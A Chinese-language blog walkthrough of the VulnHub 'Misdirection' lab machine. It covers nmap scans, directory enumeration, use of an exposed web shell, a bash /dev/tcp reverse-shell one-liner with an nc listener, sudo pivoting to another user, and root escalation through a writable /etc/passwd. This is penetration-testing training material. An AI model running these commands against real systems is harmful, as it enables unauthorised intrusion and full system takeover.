@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/154585050?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 靶机信息
+misdirection是一台vulnhub中的简单难度的渗透测试靶机。">
+<meta property="og:title" content="Misdirection">
+<meta property="og:description" content="# 靶机信息
+misdirection是一台vulnhub中的简单难度的渗透测试靶机。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dehua-rd.github.io/post/Misdirection.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
+<title>Misdirection</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Misdirection</h1>
+<div class="title-right">
+    <a href="https://dehua-rd.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/dehua-rd/dehua-rd.github.io/issues/24" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>靶机信息</h1>
+<p>misdirection是一台vulnhub中的简单难度的渗透测试靶机。</p>
+<h1>初始信息收集</h1>
+<h2>Nmap扫描</h2>
+<p>先扫描开放端口的详细信息</p>
+<pre class="notranslate"><code class="notranslate">└─$ nmap -sCV -p$port -O --min-rate 10000 192.168.218.210 -oA nmapScan/details
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 21:11 EST
+Nmap scan report for 192.168.218.210 (192.168.218.210)
+Host is up (0.00052s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)
+|   256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)
+|_  256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)
+80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
+|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+3306/tcp open  mysql   MySQL (unauthorized)
+8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+MAC Address: 00:0C:29:58:14:A1 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>再使用vuln脚本扫一下有没有能扫出来的漏洞</p>
+<pre class="notranslate"><code class="notranslate">└─$ nmap --script=vuln --min-rate 10000 -p$port 192.168.218.210 -oA nmapScan/vuln
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-09 21:14 EST
+Nmap scan report for 192.168.218.210 (192.168.218.210)
+Host is up (0.00040s latency).
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.218.210
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://192.168.218.210:80/init/default/user/login?_next=/init/default/index
+|     Form id: auth_user_email__row
+|     Form action: #
+|     
+|     Path: http://192.168.218.210:80/init/default/user/register?_next=/init/default/index
+|     Form id: auth_user_first_name__row
+|     Form action: #
+|     
+|     Path: http://192.168.218.210:80/init/default/user/request_reset_password?_next=/init/default/index
+|     Form id: auth_user_email__row
+|     Form action: #
+|     
+|     Path: http://192.168.218.210:80/init/default/elections
+|     Form id: auth_user_email__row
+|     Form action: #
+|     
+|     Path: http://192.168.218.210:80/init/default/user/register
+|     Form id: auth_user_first_name__row
+|     Form action: #
+|     
+|     Path: http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex
+|     Form id: auth_user_email__row
+|     Form action: #
+|     
+|     Path: http://192.168.218.210:80/init/default/user/login
+|     Form id: auth_user_email__row
+|     Form action: #
+|     
+|     Path: http://192.168.218.210:80/init/default/user/request_reset_password
+|     Form id: auth_user_email__row
+|_    Form action: #
+| http-sql-injection: 
+|   Possible sqli for queries:
+|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Ffeatures%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Felections%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/register?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
+|     http://192.168.218.210:80/init/default/user/request_reset_password?_next=%2Finit%2Fdefault%2Fsupport%27%20OR%20sqlspider
+|_    http://192.168.218.210:80/init/default/user/login?_next=%2Finit%2Fdefault%2Findex%27%20OR%20sqlspider
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /admin/: Possible admin folder
+|   /admin/admin/: Possible admin folder
+|   /admin/backup/: Possible backup
+|   /admin/download/backup.sql: Possible database backup
+|   /examples/: Sample scripts
+|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS
+|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
+|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload
+|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
+|   /admin/jscript/upload.php: Lizard Cart/Remote File upload
+|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
+|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload
+|_  /admin/jscript/upload.asp: Lizard Cart/Remote File upload
+3306/tcp open  mysql
+8080/tcp open  http-proxy
+| http-enum: 
+|   /wordpress/: Blog
+|   /wordpress/wp-login.php: Wordpress login page.
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /debug/: Potentially interesting folder
+|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+MAC Address: 00:0C:29:58:14:A1 (VMware)
+
+</code></pre>
+<h2>初始信息枚举</h2>
+<p>先看优先级较高的mysql服务，尝试空密码可不可以登录</p>
+<pre class="notranslate"><code class="notranslate">└─$ mysql -h 192.168.218.210 -P 3306 -u root -p
+Enter password: 
+WARNING: option --ssl-verify-server-cert is disabled, because of an insecure passwordless login.
+ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.218.148' is not allowed to connect to this MySQL server
+</code></pre>
+<p>不行，不继续尝试爆破了，先看 80和8080 端口的 web 服务。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f46d7c6f-872f-44b2-ac96-56ecb98ca8a6"><img width="1919" height="974" alt="Image" src="https://github.com/user-attachments/assets/f46d7c6f-872f-44b2-ac96-56ecb98ca8a6" style="max-width: 100%; height: auto; max-height: 974px;"></a></p>
+<p>先看 80 端口的，好像是一个E-Vote投票网站。搜了一下好像没看到什么明显能直接打进去的漏洞，先注册登录，不知道为啥注册不了，那先不管了，再扫一下目录，使用gobuster扫，发现全部400，然后再使用dirsearch扫一遍，发现有个admin目录下的是200，看一下。好像没东西。还有8080端口，也先看一下。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4128c469-343f-4367-9a33-eceee4a54deb"><img width="1919" height="967" alt="Image" src="https://github.com/user-attachments/assets/4128c469-343f-4367-9a33-eceee4a54deb" style="max-width: 100%; height: auto; max-height: 967px;"></a></p>
+是一个 apache 默认页面，扫一下目录
+<pre class="notranslate"><code class="notranslate">[22:07:17] 200 -    3KB - /debug/                                           
+[22:07:17] 200 -  411B  - /development/                                     
+[22:07:20] 301 -  324B  - /help  -&gt;  http://192.168.218.210:8080/help/      
+[22:07:20] 200 -  407B  - /help/                                            
+[22:07:21] 301 -  326B  - /images  -&gt;  http://192.168.218.210:8080/images/  
+[22:07:21] 200 -  409B  - /images/                                          
+[22:07:22] 200 -  406B  - /js/                                              
+[22:07:23] 301 -  326B  - /manual  -&gt;  http://192.168.218.210:8080/manual/  
+[22:07:30] 301 -  327B  - /scripts  -&gt;  http://192.168.218.210:8080/scripts/
+[22:07:30] 200 -  407B  - /scripts/
+[22:07:30] 403 -  305B  - /server-status                                    
+[22:07:30] 403 -  306B  - /server-status/
+[22:07:31] 301 -  325B  - /shell  -&gt;  http://192.168.218.210:8080/shell/    
+[22:07:31] 200 -  407B  - /shell/                                           
+[22:07:38] 200 -    1KB - /wordpress/wp-login.php                           
+[22:07:38] 200 -    4KB - /wordpress/
+</code></pre>
+<p>东西挺多，一次看一下，先看 debug 吧</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/bbc02a90-6d84-4506-803d-c60cbd3bc177"><img width="1919" height="968" alt="Image" src="https://github.com/user-attachments/assets/bbc02a90-6d84-4506-803d-c60cbd3bc177" style="max-width: 100%; height: auto; max-height: 968px;"></a></p>
+<p>是一个shell，感觉是入口，直接给我 www-data 的权限，扒拉一下</p>
+<pre class="notranslate"><code class="notranslate">p0wny@shell:/home/brexit# sudo -l
+Matching Defaults entries for www-data on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on localhost:
+    (brexit) NOPASSWD: /bin/bash
+</code></pre>
+<pre class="notranslate"><code class="notranslate">p0wny@shell:/home/brexit# sudo -u brexit /bin/bash
+p0wny@shell:/home/brexit# whoami
+www-data
+p0wny@shell:/home/brexit# sudo -u brexit /bin/bash
+p0wny@shell:/home/brexit# whoami
+www-data
+p0wny@shell:/home/brexit#
+</code></pre>
+<p>没成功，奇怪，难道是shell的问题，换netcat上去。</p>
+<p><code class="notranslate">/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1'</code></p>
+<p>在kali开启监听，链接</p>
+<pre class="notranslate"><code class="notranslate">└─$ rlwrap -cAr nc -lvnp 1234     
+listening on [any] 1234 ...
+connect to [192.168.218.148] from (UNKNOWN) [192.168.218.210] 35642
+bash: cannot set terminal process group (794): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@misdirection:/var/www/html/wordpress/wp-admin$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on localhost:
+    (brexit) NOPASSWD: /bin/bash
+www-data@misdirection:/var/www/html/wordpress/wp-admin$ sudo -u brexit /bin/bash
+&lt;w/html/wordpress/wp-admin$ sudo -u brexit /bin/bash    
+whoami
+brexit
+</code></pre>
+<h2>提权</h2>
+<p>系统中有 python 可以将 shell 升级一下，可以参考我的 <a href="https://dehua-rd.github.io/post/shell-xiang-guan.html" rel="nofollow">shell相关</a>来创建和升级shell，然后正式开始提权。</p>
+<p>brexit 目录中的文件感觉有用，先上linpeas梭一把，看到brexit用户有个定时任务</p>
+<pre class="notranslate"><code class="notranslate">brexit@misdirection:~$ crontab -l
+crontab -l
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+@reboot /home/brexit/start-vote.sh
+brexit@misdirection:~$ 
+</code></pre>
+<p>这个sh文件中只有一句话 <code class="notranslate">source ~/web2py/venv/bin/activate &amp;&amp; python ~/web2py/web2py.py -a '&lt;recycle&gt;'</code></p>
+<p>是一个Web2Py框架还往里面传了一个参数，搜索一下有什么漏洞可以利用，找了一会发现都是brexit用户的，没法提权啊也，再翻一下刚刚linpeas的结果，发现 /etc/passwd 的组是brexit ，passwd文件是可写的，那就简单了，还好没有死磕py文件。<code class="notranslate">-rwxrwxr--  1 root brexit     1617 Jun  1  2019 passwd</code></p>
+<p>直接改brexit的用户id为0，或者添加一个新的用户ID为0的用户，就可以直接提权了。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://dehua-rd.github.io">dehua</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","dehua-rd/dehua-rd.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
